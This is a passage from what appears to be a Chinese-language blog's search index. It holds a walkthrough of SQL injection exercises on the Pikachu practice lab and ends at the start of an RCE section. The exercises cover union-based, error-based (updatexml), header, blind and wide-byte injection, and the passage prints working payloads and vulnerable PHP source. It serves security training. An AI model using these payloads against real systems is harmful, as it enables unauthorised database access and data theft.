\uff08\u5176\u5b9e\u8fd9\u90e8\u5206\u6211\u770b\u4e0d\u61c2\uff0c\u90fd\u662f\u590d\u5236\u7c98\u8d34\u7684\uff09 \u4e0exss\u4e00\u6837\uff0c\u6211\u4eec\u8981\u53bb\u6784\u9020\u5408\u6cd5\u95ed\u5408\uff0c\u524d\u9762\u7684\u5355\u5f15\u53f7\u6211\u4eec\u4e5f\u4ee5\u5355\u5f15\u53f7\u95ed\u5408\uff0c\u540e\u9762\u7684\u5355\u5f15\u53f7\u6211\u4eec\u7528#\u6ce8\u91ca\u6389\uff0c\u6240\u4ee5\u6211\u4eec\u8f93\u5165\u7684\u4ee3\u7801\u4e3a<code>a' or 1=1#</code> \u63d0\u4ea4\u540e\u53d1\u73b0\u6240\u6709\u7684\u6570\u636e\u90fd\u5217\u4e86\u51fa\u6765\uff1a</p>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#4x03","title":"4x03 \u641c\u7d22\u578b\u6ce8\u5165","text":"<ol> <li>\u6211\u4eec\u5c1d\u8bd5\u8f93\u5165a\u8fdb\u884c\u641c\u7d22\uff0c\u53d1\u73b0\u8bf7\u5728\u5728url\u91cc\u53d1\u9001\uff0c\u4e14\u8fd4\u56de\u4e86\u6240\u6709\u5e26a\u7684\u7528\u6237</li> <li>\u7531\u4e8e\u63d0\u793a\u4e3a%%\uff0c\u6240\u4ee5\u6211\u4eec\u731c\u6d4b</li> </ol> <p>SQL<pre><code>select from \u8868\u540d where username like ' %k% ';\n</code></pre>  \u6211\u4eec\u4f9d\u65e7\u662f\u5c1d\u8bd5\u53bb\u6784\u9020\u95ed\u5408\uff1a \u6211\u4eec\u8f93\u5165<code>abc%'or 1=1 #</code>\uff0c\u7528%\u2019\u53bb\u4e0e\u524d\u9762\u7684%\u2018\u6784\u9020\u95ed\u5408\uff0c\u800c\u540e\u9762\u7684\u5185\u5bb9\u7528#\u6ce8\u91ca\u6389 \u6b64\u65f6\u5b8c\u6574\u8bed\u53e5\u4e3a\uff1a SQL<pre><code>select from \u8868\u540d where username like ' %abc%'or 1=1 #% ';\n</code></pre> \u8f93\u5165\u540e\u53d1\u73b0\u6240\u6709\u6570\u636e\u90fd\u88ab\u5217\u51fa \u7531\u6b64\u53d1\u73b0\uff0c\u5173\u952e\u5728\u4e8e\u731c\u6d4b\u540e\u53f0\u662f\u5982\u4f55\u8fdb\u884c\u62fc\u63a5\u7684\u5e76\u5c1d\u8bd5\u53bb\u6784\u9020\u95ed\u5408\u3002</p>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#4x04-xx","title":"4x04 xx\u578b\u6ce8\u5165","text":"<ol> <li>\u6211\u4eec\u8fdb\u5165\u540e\u7aef\uff0c\u8bbf\u95ee\\WWW\\pikachu\\vul\\sqli\\sqli_x.php\uff0c\u5176\u4e2d\u4ee3\u7801\u5982\u4e0b\uff1a</li> </ol> <p>PHP<pre><code>if(isset($_GET['submit']) &amp;&amp; $_GET['name']!=null){\n    //\u8fd9\u91cc\u6ca1\u6709\u505a\u4efb\u4f55\u5904\u7406\uff0c\u76f4\u63a5\u62fc\u5230select\u91cc\u9762\u53bb\u4e86\n    $name=$_GET['name'];\n    //\u8fd9\u91cc\u7684\u53d8\u91cf\u662f\u5b57\u7b26\u578b\uff0c\u9700\u8981\u8003\u8651\u95ed\u5408\n    $query=\"select id,email from member where username=('$name')\";\n    $result=execute($link, $query);\n    if(mysqli_num_rows($result)&gt;=1){\n        while($data=mysqli_fetch_assoc($result)){\n            $id=$data['id'];\n            $email=$data['email'];\n            $html.=\"&lt;p class='notice'&gt;your uid:{$id} &lt;br /&gt;your email is: {$email}&lt;/p&gt;\";\n        }\n    }else{\n\n        $html.=\"&lt;p class='notice'&gt;\u60a8\u8f93\u5165\u7684username\u4e0d\u5b58\u5728\uff0c\u8bf7\u91cd\u65b0\u8f93\u5165\uff01&lt;/p&gt;\";\n    }\n}\n</code></pre> \u6240\u4ee5\u6211\u4eec\u8fd8\u662f\u5c1d\u8bd5\u53bb\u6784\u9020\u95ed\u5408\uff0c\u540e\u7aef\u4e3a</p> <p>SQL<pre><code>select id,email from member where username=('$name')\n</code></pre> \u6211\u4eec\u5e94\u8be5\u8f93\u5165<code>a') or 1=1 #</code>  \u6210\u529f\u8fd4\u56de\u4e86\u6240\u6709\u6570\u636e\u3002</p>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#4x05-sql-injecunionl","title":"4x05 SQL Injec\u6f0f\u6d1e\u624b\u5de5\u6d4b\u8bd5\uff1a\u57fa\u4e8eunionl\u8054\u5408\u67e5\u8be2\u7684\u4fe1\u606f\u83b7\u53d6","text":"<p>union\u8054\u5408\u67e5\u8be2\uff1a\u53ef\u4ee5\u901a\u8fc7\u8054\u5408\u67e5\u8be2\u6765\u67e5\u8be2\u6307\u5b9a\u7684\u6570\u636e\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\u8054\u5408\u67e5\u8be2\u7684\u5b57\u6bb5\u6570\u5fc5\u987b\u548c\u4e3b\u67e5\u8be2\u4e00\u81f4\uff01\uff01 \u7528\u6cd5\uff1a<code>select username,password from user where id=1 union select \u5b57\u6bb51 ,\u5b57\u6bb52 from \u8868\u540d</code> 1. \u6211\u4eec\u5148\u767b\u5f55\u5e76\u8fdb\u5165pikachu\u6570\u636e\u5e93  2. \u4e3b\u67e5\u8be2\u5b57\u6bb52\u4e2a\uff08id,email\uff09 \u8054\u5408\u67e5\u8be2\u5b57\u6bb5\u4e09\u4e2a\uff08username,pw,sex\uff09\u5c06\u4f1a\u62a5\u9519\uff0c\u6211\u4eec\u8f93\u5165<code>select id, email from member where username-'kobe' union select username, pw, sex from member where id = 1;</code>\u7ed3\u679c\u5982\u4e0b\uff1a  3. \u6211\u4eec\u5c1d\u8bd5\u53bb\u731c\u6d4b\u5b57\u6bb5\u6570\uff0c\u6211\u4eec\u7528<code>x' union select 1,2,3#</code>\uff0c\u6b64\u5904\u76841 2 3\u8868\u793a\u5b57\u6bb5\uff0c\u6b64\u65f6\u4ecd\u4f1a\u62a5\u9519\uff0c\u6211\u4eec\u5c1d\u8bd5<code>x' union select 1,2#</code>\uff0c\u53d1\u73b0\u6ca1\u6709\u62a5\u9519\uff0c\u8bf4\u660e\u5b57\u6bb5\u6570\u4e3a2\u3002  4. \u786e\u8ba4\u5b57\u6bb5\u540e\uff0c\u6211\u4eec\u4f7f\u7528\u8054\u5408\u67e5\u8be2\uff0c<code>x' union select database(),version()#</code>\uff0c\u5982\u56fe\uff0c\u6211\u4eec\u67e5\u8be2\u51fa\u4e86\u6570\u636e\u5e93\u540d\u79f0\u548c\u6570\u636e\u5e93\u7248\u672c\u3002</p> <p>mysql\u77e5\u8bc6\u70b9\uff1a select version(); //\u67e5\u8be2\u6570\u636e\u5e93\u7248\u672c select database(); //\u67e5\u8be2\u5f53\u524d\u7684\u6570\u636e\u5e93\u540d\u79f0 select user(); //\u67e5\u8be2\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237 order by x //\u5bf9\u67e5\u8be2\u7684\u7ed3\u679c\u8fdb\u884c\u6392\u5e8f\uff0c\u9ed8\u8ba4\u6570\u5b570-9\uff0c\u5b57\u6bcda-z union select //\u8054\u5408\u67e5\u8be2\uff0c\u5fc5\u987b\u4e0e\u4e3b\u67e5\u8be2\u7684\u5b57\u6bb5\u4e2a\u6570\u4fdd\u6301\u4e00\u81f4\u3002</p> <p>information_schema \u5728mysql\u4e2d\uff0c\u81ea\u5e26\u7684information_schema\u6570\u636e\u5e93\u91cc\u9762\u5b58\u653e\u4e86\u5927\u91cf\u7684\u91cd\u8981\u4fe1\u606f\u3002\u5177\u4f53\u5982\u4e0b\uff1a \u5982\u679c\u5b58\u5728\u6ce8\u5165\u70b9\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u5bf9\u8be5\u6570\u636e\u5e93\u8fdb\u884c\u8bbf\u95ee\uff0c\u4ece\u800c\u83b7\u53d6\u66f4\u591a\u7684\u4fe1\u606f\u3002 SCHEMATA\u8868\uff1a\u63d0\u4f9b\u4e86\u5f53\u524dmysql\u5b9e\u4f8b\u4e2d\u6240\u6709\u6570\u636e\u5e93\u7684\u4fe1\u606f\u3002 TABLES\u8868\uff1a\u63d0\u4f9b\u4e86\u8868\u7684\u4fe1\u606f\uff08\u5305\u62ec\u89c6\u56fe\uff09\u3002\u8be6\u7ec6\u63cf\u8ff0\u4e86\u67d0\u4e2a\u8868\u5c5e\u4e8e\u54ea\u4e2a schema\uff0c\u8868\u7c7b\u578b\uff0c\u8868\u5f15\u64ce\uff0c\u521b\u5efa\u65f6\u95f4\u7b49\u4fe1\u606f\u3002 COLUMNS\u8868\uff1a\u63d0\u4f9b\u4e86\u8868\u4e2d\u5b57\u6bb5\u7684\u4fe1\u606f\u3002</p>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#4x06-insertupdate","title":"4x06 \"insert/update\"\u6ce8\u5165","text":"<p>\u6211\u4eec\u7684\u8fd9\u4e2a\u653b\u51fb\u662f\u5728MYSQL\u4e2d\u4f7f\u7528\u4e00\u4e9b\u6307\u5b9a\u7684\u51fd\u6570\u6765\u5236\u9020\u62a5\u9519\uff0c\u4ece\u800c\u4ece\u62a5\u9519\u4fe1\u606f\u4e2d\u83b7\u53d6\u8bbe\u5b9a\u7684\u4fe1\u606fselect/insert/update/delete\u90fd\u53ef\u4ee5\u4f7f\u7528\u62a5\u9519\u6765\u83b7\u53d6\u4fe1\u606f\u3002\u800c\u8fd9\u6837\u653b\u51fb\u6210\u529f\u7684\u6761\u4ef6\u5c31\u662f\u540e\u53f0\u6ca1\u6709\u5c4f\u853d\u6570\u636e\u5e93\u62a5\u9519\u4fe1\u606f\uff0c\u5728\u8bed\u6cd5\u53d1\u751f\u9519\u8bef\u65f6\u4f1a\u8f93\u51fa\u5728\u524d\u7aef\u3002</p> <ol> <li>\u6839\u636e\u63d0\u793a\uff0c\u6211\u4eec\u5148\u8fdb\u884c\u6ce8\u518c\uff0c\u6211\u586b\u5199\u7684\u6ce8\u518c\u4fe1\u606f\u5982\u4e0b\u56fe\u6240\u793a\uff1a </li> <li>\u6211\u4eec\u7528Burp\u6293\u5305\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a </li> <li>\u6211\u4eec\u5148\u5728\u6ce8\u518c\u9875\u9762\u5c1d\u8bd5\u4e00\u4e0b\uff0c\u6211\u4eec\u628a\u5fc5\u586b\u9879\u586b\u597d\uff1a\u5728\u7528\u6237\u91cc\u586b\u5165\u2019\uff0c\u5bc6\u7801\u968f\u4fbf\u586b\u5199\uff0c\u63d0\u4ea4\uff0c\u7ed3\u679c\u5982\u56fe\u6240\u793a </li> <li>\u8be5\u62a5\u9519\u9875\u9762\u8bf4\u660e\u6211\u4eec\u7684\u5355\u5f15\u53f7\u88ab\u62fc\u63a5\u5728\u4e86sql\u8bed\u53e5\u4e2d\uff0c\u6211\u4eec\u5148\u767b\u5f55\u4e4b\u524d\u6ce8\u518c\u53f7\u7684\u8d26\u6237 \u767b\u9646\u597d\u540e\u6211\u4eec\u53bb\u4fee\u6539\u4e2a\u4eba\u4fe1\u606f\uff0c</li> </ol> <p>\u8fd9\u91cc\u5148\u4e86\u89e3\u4e00\u4e0bupdatexml()\u51fd\u6570\u7684\u7528\u6cd5\u3002 \u8bed\u6cd5\uff1aupdatexml(xml document, XPathing, new_value) \u7b2c\u4e00\u4e2a\u53c2\u6570\uff1aXML_document\u662fString\u683c\u5f0f\uff0c\u4e3aXML\u6587\u6863\u5bf9\u8c61\u7684\u540d\u79f0\uff0c\u4e5f\u5c31\u662f\u8868\u4e2d\u7684\u5b57\u6bb5\u540d \u7b2c\u4e8c\u4e2a\u53c2\u6570\uff1aXPath_string (Xpath\u683c\u5f0f\u7684\u5b57\u7b26\u4e32) \u7b2c\u4e09\u4e2a\u53c2\u6570\uff1anew_value\uff0cString\u683c\u5f0f\uff0c\u66ff\u6362\u67e5\u627e\u5230\u7684\u7b26\u5408\u6761\u4ef6\u7684\u6570\u636e \u5176\u4e2dXPath\u5fc5\u987b\u662f\u6709\u6548\u7684\uff0c\u5426\u5219\u4f1a\u53d1\u751f\u9519\u8bef</p> <p>\u56e0\u4e3a\u76f4\u63a5\u5728XPath\u5904\u8f93\u5165database()\u4f1a\u8fd4\u56de\u9519\u8bef\u503c\uff0c\u6240\u4ee5\u6211\u4eecconcat(0x7e, database())\uff0c\u5176\u4e2d0x7e\u8868\u793a\u7b26\u53f7~\uff0cconcat()\u4f1a\u5c06\u9017\u53f7\u524d\u540e\u4e24\u90e8\u5206\u8fdb\u884c\u4e00\u4e2a\u62fc\u63a5\u3002 \u6240\u4ee5\u8fd9\u91cc\u6211\u4eec\u5c06\u6027\u522b\u4fee\u6539\u4e3a<code>' and updatexml(1, concat(0x7e, database()), 0) #'</code> \u8f93\u5165\u540e\u53d1\u73b0\u6210\u529f\u5c06\u6570\u636e\u5e93\u7684\u540d\u79f0\u8fd4\u56de\u6765\u4e86 \u540c\u7406\u53ef\u4ee5\u628adatabase()\u6539\u4e3a\u5176\u4ed6\u51fd\u6570\u6765\u83b7\u5f97\u66f4\u591a\u6570\u636e\u5e93\u4fe1\u606f\u3002</p>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#4x07-delete","title":"4x07 \"delete\"\u6ce8\u5165","text":"<ol> <li>\u63d0\u793a\u8bf4\uff1a\u201c\u5220\u9664\u7559\u8a00\u7684\u7684\u65f6\u5019,\u597d\u50cf\u6709\u70b9\u95ee\u9898\u201d\u3002 \u6211\u4eec\u968f\u4fbf\u8f93\u5165\u4e00\u6761\u7559\u8a00\u201cabc\u201d</li> <li>\u70b9\u51fb\u5220\u9664\u5e76\u7528Burp\u6293\u5305\u770b\u4e00\u770b\uff0c\u5982\u56fe\uff0c\u662fGET\u4f20\u53c2\uff0c\u6211\u4eec\u5c06\u5176\u53d1\u9001\u5230Repeater\u6a21\u5757\u3002 </li> <li>\u6211\u4eec\u5728id=\u5904\u8f93\u5165<code>1 or updatexml(1, concat(0x7e, database()), 0)</code>\uff0c\u518d\u5c06\u6b64\u6bb5\u4ee3\u7801\u8f6c\u6362\u4e3a\u7279\u6b8a\u5b57\u7b26\u7684url\u7f16\u7801\u3002</li> </ol> <ol> <li>\u6211\u4eec\u5c06\u6570\u636e\u5305\u53d1\u9001\uff0c\u53d1\u73b0\u6210\u529f\u7684\u8fd4\u56de\u4e86\u4fe1\u606f\u3002</li> </ol>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#4x08-http-header","title":"4x08 \"http header\"\u6ce8\u5165","text":"<p>\u9996\u5148\u6765\u4e86\u89e3\u4e00\u4e0b\u4ec0\u4e48\u662f\"http header\"\u6ce8\u5165</p> <p>\u6709\u4e9b\u65f6\u5019\uff0c\u540e\u53f0\u5f00\u53d1\u4eba\u5458\u4e3a\u4e86\u9a8c\u8bc1\u5ba2\u6237\u7aef\u5934\u4fe1\u606f\uff08\u6bd4\u5982\u5e38\u7528\u7684cookie\u9a8c\u8bc1\uff09, \u6216\u8005\u901a\u8fc7http header\u5934\u4fe1\u606f\u83b7\u53d6\u5ba2\u6237\u7aef\u7684\u4e00\u4e9b\u8d44\u6599\uff0c\u6bd4\u5982useragent\u3001accept\u5b57\u6bb5\u7b49\uff0c\u4f1a\u5bf9\u5ba2\u6237\u7aef\u7684http header\u4fe1\u606f\u8fdb\u884c\u83b7\u53d6\u5e76\u4f7f\u7528SQL\u8fdb\u884c\u5904\u7406\uff0c \u5982\u679c\u6b64\u65f6\u6ca1\u6709\u8db3\u591f\u7684\u5b89\u5168\u8003\u8651\u5219\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u4e8ehttp header\u7684SQL\u6ce8\u5165\u6f0f\u6d1e\u3002 1. \u6211\u4eec\u5148\u8fdb\u884c\u767b\u5f55 admin/123456 2. \u5728\u6293\u5230\u7684\u6570\u636e\u5305\u4e2d\uff0c\u6211\u4eec\u53d1\u73b0\u4e86user agent\u7b49\u9879\u76ee  3. \u6211\u4eec\u5c06\u6b64\u6570\u636e\u5305\u53d1\u9001\u81f3\u91cd\u653e\u5668\uff0c\u5e76\u5c06user agent\u5185\u5bb9\u4fee\u6539\u4e3a<code>' or updatexml(1,concat(0x7e, database()), 0) or '</code>\uff0c\u53d1\u9001\u540e\u53d1\u73b0\u6210\u529f\u8fd4\u56de\u4e86\u6570\u636e</p>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#4x09-base-on-boolian","title":"4x09 \u76f2\u6ce8(base on boolian)","text":"<p>\u9996\u5148\u4e86\u89e3\u4e0b\u76f2\u6ce8\u7684\u6982\u5ff5</p> <p>\uff081\uff09\u76f2\u6ce8\u5c31\u662f\u5728sql\u6ce8\u5165\u8fc7\u7a0b\u4e2d\uff0csql\u8bed\u53e5\u6267\u884cselect\u4e4b\u540e\uff0c\u53ef\u80fd\u7531\u4e8e\u7f51\u7ad9\u4ee3\u7801\u7684\u9650\u5236\u6216\u8005apache\u7b49\u89e3\u6790\u5668\u914d\u7f6e\u4e86\u4e0d\u56de\u663e\u6570\u636e\uff0c\u9020\u6210\u5728select\u6570\u636e\u4e4b\u540e\u4e0d\u80fd\u56de\u663e\u5230\u524d\u7aef\u9875\u9762\u3002\u6b64\u65f6\uff0c\u6211\u4eec\u9700\u8981\u5229\u7528\u4e00\u4e9b\u65b9\u6cd5\u8fdb\u884c\u5224\u65ad\u6216\u8005\u5c1d\u8bd5\uff0c\u8fd9\u4e2a\u5224\u65ad\u7684\u8fc7\u7a0b\u79f0\u4e4b\u4e3a\u76f2\u6ce8\u3002</p> <p>\u901a\u4fd7\u7684\u8bb2\u5c31\u662f\u5728\u524d\u7aef\u9875\u9762\u6ca1\u6709\u663e\u793a\u4f4d\uff0c\u4e0d\u80fd\u8fd4\u56desql\u8bed\u53e5\u6267\u884c\u9519\u8bef\u7684\u4fe1\u606f\uff0c\u8f93\u5165\u6b63\u786e\u548c\u9519\u8bef\u8fd4\u56de\u7684\u4fe1\u606f\u90fd\u662f\u4e00\u81f4\u7684\uff0c\u8fd9\u65f6\u5019\u6211\u4eec\u5c31\u9700\u8981\u4f7f\u7528\u9875\u9762\u7684\u6b63\u5e38\u4e0e\u4e0d\u6b63\u5e38\u663e\u793a\u6765\u8fdb\u884csql\u6ce8\u5165\u3002</p> <p>\uff082\uff09\u76f2\u6ce8\u53c8\u5206\u4e3a\u5e03\u5c14\u7c7b\u578b\u548c\u65f6\u95f4\u7c7b\u578b</p> <p>\u4ec0\u4e48\u60c5\u51b5\u4e0b\u4f7f\u7528\u5e03\u5c14\u7c7b\u578b\u7684\u76f2\u6ce8\uff1f</p> <ul> <li>\u6ca1\u6709\u8fd4\u56deSQL\u6267\u884c\u7684\u9519\u8bef\u4fe1\u606f</li> <li>\u9519\u8bef\u4e0e\u6b63\u786e\u7684\u8f93\u5165\uff0c\u8fd4\u56de\u7684\u7ed3\u679c\u53ea\u6709\u4e24\u79cd</li> </ul> <p>\u4ec0\u4e48\u60c5\u51b5\u4e0b\u4f7f\u7528\u65f6\u95f4\u7c7b\u578b\u7684\u76f2\u6ce8\uff1f</p> <ul> <li>\u9875\u9762\u4e0a\u6ca1\u6709\u663e\u793a\u4f4d\u548cSQL\u8bed\u53e5\u6267\u884c\u7684\u9519\u8bef\u4fe1\u606f\uff0c\u6b63\u786e\u6267\u884c\u548c\u9519\u8bef\u6267\u884c\u7684\u8fd4\u56de\u754c\u9762\u4e00\u6837\uff0c\u6b64\u65f6\u9700\u8981\u4f7f\u7528\u65f6\u95f4\u7c7b\u578b\u7684\u76f2\u6ce8\u3002</li> </ul> <p>\u65f6\u95f4\u578b\u76f2\u6ce8\u4e0e\u5e03\u5c14\u578b\u76f2\u6ce8\u7684\u8bed\u53e5\u6784\u9020\u8fc7\u7a0b\u7c7b\u4f3c\uff0c\u901a\u5e38\u5728\u5e03\u5c14\u578b\u76f2\u6ce8\u8868\u8fbe\u5f0f\u7684\u57fa\u7840\u4e0a\u4f7f\u7528IF\u8bed\u53e5\u52a0\u5165\u5ef6\u65f6\u8bed\u53e5\u6765\u6784\u9020\uff0c\u7531\u4e8e\u65f6\u95f4\u578b\u76f2\u6ce8\u8017\u65f6\u8f83\u5927\uff0c\u901a\u5e38\u5229\u7528\u811a\u672c\u5de5\u5177\u6765\u6267\u884c\uff0c\u5728\u624b\u5de5\u5229\u7528\u7684\u8fc7\u7a0b\u4e2d\u8f83\u5c11\u4f7f\u7528\u3002</p> <ol> <li>\u672c\u9898\u4e3a\u5e03\u5c14\u578b\uff0c\u6211\u4eec\u8f93\u5165<code>kobe' or 1=1#</code>\uff0c\u663e\u793a\u201c\u60a8\u8f93\u5165\u7684username\u4e0d\u5b58\u5728\uff0c\u8bf7\u91cd\u65b0\u8f93\u5165\uff01\u201d\u3002\u518d\u8bd5\u8bd5<code>kobe' or 1=2#</code>\uff0c\u663e\u793a\u5982\u4e0b\uff1a</li> <li>\u53ef\u89c1\uff0c\u53ea\u6709\u6211\u4eec\u8f93\u5165\u7684\u6761\u4ef6\u4e3a\u771f\u65f6\uff0c\u624d\u80fd\u8f93\u51fa\u6b63\u786e\u4fe1\u606f\u3002 \u8fd9\u6b21\u6211\u4eec\u8f93\u5165<code>kobe' and length(database())=1#</code>\uff0c\u663e\u793a\u60a8\u8f93\u5165\u7684username\u4e0d\u5b58\u5728....... \u518d\u628a1\u6362\u62102\uff0c\u4ee5\u6b64\u7c7b\u63a8\uff0c\u53d1\u73b0=7\u7684\u65f6\u5019\uff0c\u8f93\u51fa\u4e86\u6b63\u786e\u4fe1\u606f</li> <li>\u90a3\u4e48\uff0c\u6211\u4eec\u5c31\u77e5\u9053\u4e86\u6570\u636e\u5e93\u957f\u5ea6\u4e3a7\uff0c\u540c\u7406\uff0c\u66f4\u6362\u5176\u4ed6\u51fd\u6570\u6765\u6d4b\u8bd5\u5176\u4ed6\u6570\u636e</li> </ol>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#4x10-base-on-time","title":"4x10 \u76f2\u6ce8(base on time)","text":"<p>\u672c\u9898\u4e3a\u57fa\u4e8e\u65f6\u95f4\u7c7b\u578b\u7684\u76f2\u6ce8</p> <p>\u6b64\u79cd\u7c7b\u578b\u9002\u7528\u4e8e\u65e0\u8bba\u8f93\u5165\u662f\u5426\u6b63\u786e\uff0c\u90fd\u8fd4\u56de\u76f8\u540c\u6570\u636e\uff0c\u6211\u4eec\u65e0\u6cd5\u5224\u65ad\u81ea\u5df1\u8f93\u5165\u7684\u6761\u4ef6\u662f\u5426\u4e3a\u771f\uff0c\u6240\u4ee5\u5728\u540e\u9762\u52a0\u4e86\u4e00\u4e2a\u65f6\u95f4\u9650\u5236</p> <ol> <li>\u5148\u50cf\u4e0a\u9898\u90a3\u6837\uff0c\u8f93\u5165<code>kobe' and length(database())=7#</code></li> <li>\u8bd5\u8bd5\u5176\u4ed6\u8bed\u53e5\uff0c\u6211\u4eec\u53d1\u73b0 \uff0c\u65e0\u8bba\u8f93\u5165\u4ec0\u4e48\uff0c\u56de\u663e\u7684\u90fd\u662f\u8fd9\u53e5\u8bdd\uff0c\u6240\u4ee5\uff0c\u6211\u4eec\u8fd9\u65f6\u5c31\u53ef\u4ee5\u4f7f\u7528\u65f6\u95f4\u76f2\u6ce8\u4e86 \u8f93\u5165kobe' and if(length(database())=7, sleep(1),5)# \u610f\u601d\u4e3a\uff1a\u82e5length(database())=7\u6b63\u786e\uff0c\u5ef6\u8fdf1\u79d2\u8fd4\u56de\uff1a\u82e5\u4e0d\u6b63\u786e\uff0c\u5ef6\u8fdf5\u79d2\u8fd4\u56de \u6211\u4eec\u53bb\u6d4b\u8bd5\uff0c\u53d1\u73b0\u8fd4\u56de\u7684\u867d\u7136\u90fd\u662f\u90a3\u53e5I don't care who you are! \u4f46\u6761\u4ef6\u6b63\u786e\u548c\u4e0d\u6b63\u786e\u7684\u56de\u663e\u65f6\u95f4\u4e0d\u540c\uff0c\u4ee5\u6b64\u6765\u5224\u65ad\u54ea\u4e2a\u662f\u6b63\u786e\u6761\u4ef6</li> </ol>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#4x11","title":"4x11 \u5bbd\u5b57\u8282\u6ce8\u5165","text":"<p>\u8fd8\u662f\u5148\u4e86\u89e3\u4e00\u4e0b\u5bbd\u5b57\u8282\u7684\u539f\u7406</p> <p>\u5148\u4e86\u89e3\u4e00\u4e0b\u4ec0\u4e48\u662f\u7a84\u3001\u5bbd\u5b57\u8282\u5df2\u7ecf\u5e38\u89c1\u5bbd\u5b57\u8282\u7f16\u7801\uff1a</p> <ul> <li>\u5f53\u67d0\u5b57\u7b26\u7684\u5927\u5c0f\u4e3a\u4e00\u4e2a\u5b57\u8282\u65f6\uff0c\u79f0\u5176\u5b57\u7b26\u4e3a\u7a84\u5b57\u8282.</li> <li>\u5f53\u67d0\u5b57\u7b26\u7684\u5927\u5c0f\u4e3a\u4e24\u4e2a\u5b57\u8282\u65f6\uff0c\u79f0\u5176\u5b57\u7b26\u4e3a\u5bbd\u5b57\u8282.</li> <li>\u6240\u6709\u82f1\u6587\u9ed8\u8ba4\u5360\u4e00\u4e2a\u5b57\u8282\uff0c\u6c49\u5b57\u5360\u4e24\u4e2a\u5b57\u8282</li> </ul> <p>\u5e38\u89c1\u7684\u5bbd\u5b57\u8282\u7f16\u7801\uff1aGB2312,GBK,GB18030,BIG5,Shift_JIS\u7b49</p> <p>\u5bbd\u5b57\u8282\u6ce8\u5165\u6307\u7684\u662f mysql \u6570\u636e\u5e93\u5728\u4f7f\u7528\u5bbd\u5b57\u8282\uff08GBK\uff09\u7f16\u7801\u65f6\uff0c\u4f1a\u8ba4\u4e3a\u4e24\u4e2a\u5b57\u7b26\u662f\u4e00\u4e2a\u6c49\u5b57\uff08\u524d\u4e00\u4e2aascii\u7801\u8981\u5927\u4e8e128\uff08\u6bd4\u5982%df\uff09\uff0c\u624d\u5230\u6c49\u5b57\u7684\u8303\u56f4\uff09\uff0c\u800c\u4e14\u5f53\u6211\u4eec\u8f93\u5165\u5355\u5f15\u53f7\u65f6\uff0cmysql\u4f1a\u8c03\u7528\u8f6c\u4e49\u51fd\u6570\uff0c\u5c06\u5355\u5f15\u53f7\u53d8\u4e3a\u2019\uff0c\u5176\u4e2d\\\u7684\u5341\u516d\u8fdb\u5236\u662f%5c,mysql\u7684GBK\u7f16\u7801\uff0c\u4f1a\u8ba4\u4e3a%df%5c\u662f\u4e00\u4e2a\u5bbd\u5b57\u8282\uff0c\u4e5f\u5c31\u662f\u2019\u904b\u2019\uff0c\u4ece\u800c\u4f7f\u5355\u5f15\u53f7\u95ed\u5408\uff08\u9003\u9038\uff09\uff0c\u8fdb\u884c\u6ce8\u5165\u653b\u51fb\u3002</p> <ol> <li>\u6211\u4eec\u968f\u4fbf\u8f93\u5165\u4e00\u4e2a\u7528\u6237123\uff0c\u7528bp\u6293\u5305\u53d1\u73b0\u5176\u662fpost\u7c7b\u578b\u7684\uff0c\u518dsend to Repeater\uff0c\u7136\u540e\u5c06name\u4fee\u6539\u4e3a\u5982\u4e0b\u4ee3\u7801\uff08\u6ce8\u610ff\u540e\u9762\u6709\u4e2a\u5355\u5f15\u53f7\uff09<code>1%df' union select 1,2#</code> </li> <li>\u5982\u4e0a\u56fe\uff0c\u6211\u4eec\u5f97\u5230\u4e86\u9700\u8981\u7684\u4fe1\u606f\u3002</li> </ol>"},{"location":"WEB/labs/Pikachu%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#5-rce","title":"5 RCE","text":"<p>RCE(remote command/code execute)\u6982\u8ff0 RCE\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u8ba9\u653b\u51fb\u8005\u76f4\u63a5\u5411\u540e\u53f0\u670d\u52a1\u5668\u8fdc\u7a0b\u6ce8\u5165\u64cd\u4f5c\u7cfb\u7edf\u547d\u4ee4\u6216\u8005\u4ee3\u7801\uff0c\u4ece\u800c\u63a7\u5236\u540e\u53f0\u7cfb\u7edf\u3002 \u8fdc\u7a0b\u7cfb\u7edf\u547d\u4ee4\u6267\u884c \u4e00\u822c\u51fa\u73b0\u8fd9\u79cd\u6f0f\u6d1e\uff0c\u662f\u56e0\u4e3a\u5e94\u7528\u7cfb\u7edf\u4ece\u8bbe\u8ba1\u4e0a\u9700\u8981\u7ed9\u7528\u6237\u63d0\u4f9b\u6307\u5b9a\u7684\u8fdc\u7a0b\u547d\u4ee4\u64cd\u4f5c\u7684\u63a5\u53e3 \u6bd4\u5982\u6211\u4eec\u5e38\u89c1\u7684\u8def\u7531\u5668\u3001\u9632\u706b\u5899\u3001\u5165\u4fb5\u68c0\u6d4b\u7b49\u8bbe\u5907\u7684web\u7ba1\u7406\u754c\u9762\u4e0a 